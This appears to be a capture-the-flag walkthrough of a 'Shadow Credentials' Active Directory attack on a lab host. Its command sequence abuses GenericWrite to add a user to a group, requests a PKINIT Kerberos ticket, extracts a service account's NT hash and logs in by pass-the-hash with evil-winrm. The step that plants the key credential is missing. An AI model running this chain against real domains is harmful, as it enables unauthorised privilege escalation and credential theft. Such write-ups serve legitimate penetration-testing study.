# Shadow Credentials Attack

In this scenario, `<USER>` is a member of the **Service Accounts** group and has `GenericWrite` permissions on the group. This opens the possibility for a **Shadow Credentials** attack.



## Preparations

- Install the following tools in a virtual environment:
  - `pywhisker`
  - `PKINITtools`
  - `faketime`
- Starting a virtual environment might also be useful 

---

## Add User to Service Accounts

```bash
net rpc group addmem "Service Accounts" "<USER>" \
  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>"


Request Kerberos TGT for Service Account

If your local time does not match the Domain Controller (DC), you may encounter errors. Synchronize time first:

sudo rdate -n <TARGET_IP>


Generate a TGT using faketime:

faketime '<DATE_TIME>' python3 gettgtpkinit.py \
  -cert-pem key_cert.pem \
  -key-pem key_priv.pem \
  fluffy.htb/<SERVICE_ACCOUNT> \
  <SERVICE_ACCOUNT>.ccache


Set the Kerberos ticket environment variable:

export KRB5CCNAME=<SERVICE_ACCOUNT>.ccache


Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an absolute path if necessary.

Retrieve NT Hash
faketime '<DATE_TIME>' python3 getnthash.py \
  -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>

Access Service Account
evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>



